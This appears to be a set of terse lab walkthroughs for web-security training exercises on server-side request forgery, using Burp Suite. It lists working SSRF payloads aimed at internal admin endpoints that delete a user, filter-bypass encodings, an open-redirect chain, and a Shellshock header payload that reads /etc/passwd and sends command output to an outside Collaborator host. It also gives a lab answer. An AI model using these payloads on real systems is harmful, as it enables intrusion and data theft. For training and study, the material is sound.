# Server-side request forgery (SSRF)

**Step1 :**

Click on view detail

Then click on check stock  

**Step2 :**

Send the post request to repeater

**Step3 :**

Change the stock api value to

`http://localhost/admin/delete?username=admin`

**Step1 :**

Click on view detail

Then click on check stock  

**Step2 :**

Send the post product/stock request to intruder

Change the stockapi to `stockApi=http://192.168.0.§1§:8080/admin`

Select the ip and apply number payload

In result we have one 200 request

**Step3 :**

Send the request to intruder and chane stock api to…

`stockApi=http://192.168.0.176:8080/admin/delete?username=carlos`
  
And lab is solve
  
Now simply delete user carlos

`stockApi=http://127.1/%25%36%31dmin/delete?username=carlos`

**Step1 :**

When we change parameter it show the following error

Now we click on next product button

We have the get request

**Step2 :**

Send the request to repeater

And make the change

`/product/nextProduct?currentProductId=4&path=http://192.168.0.12:8080/admin`
  
From the result it is clear that carlos is accessible

**Step3 :**

Click on check stock and modify the check stock request to

  

`stockApi=/product/nextProduct?currentProductId=4&path=http://192.168.0.12:8080/admin/delete?username=carlos`

Url encode the above query

**Step1 :**

Click on view product

**Step2 :**

We have this request

Send the request to repeater and change referrer to collaborator id  

In collaborator we have

And the lab is solved
  
**Step1 :**

First we click on view product

**Step2 :**

Install extension from Bapp collaborator every where

**Step3 :**

Now add the this lab to scope of extension
  
Right click on add to scope

Go to lab and refresh page we can see response

**Step4 :**

Here one thing is clear that there is a blind SSRF because collaborator show interaction with endpoint

Send the below request to intruder

**Step5 :**

Add a shell lock payload to user agent

This is payload:

`Referer:() { :;}; echo "NS:" $(</etc/passwd)`

In our case it look like

`() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN`

Add it to User-agent

And change the referer to

`http://192.168.0.1:8080`

And add a number payload to 1

Payload setting
  
We can see interaction with a specific IP with in range in collaborator

**Step6 :**

Submit the answer peter-ROBIX

**Step1 :**

Click on view produdt -> check stock

**Step2 :**

Send the POST request method to repeater

Decode the stockApi to ctrl+shift+u

`http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1`

Now we replace this with

`https://localhost:80/`
  

Now we append   stock.weliketoshop.net

So it show an internal server error

Remove @stock.weliketoshop.net from request using #

`stockApi=http://localhost:80#@stock.weliketoshop.net/`

So we double encode #

`stockApi=http://localhost:80%2523@stock.weliketoshop.net/`

And we have 200 ok result

Now we simple access admin and delete user carlos
```
stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```
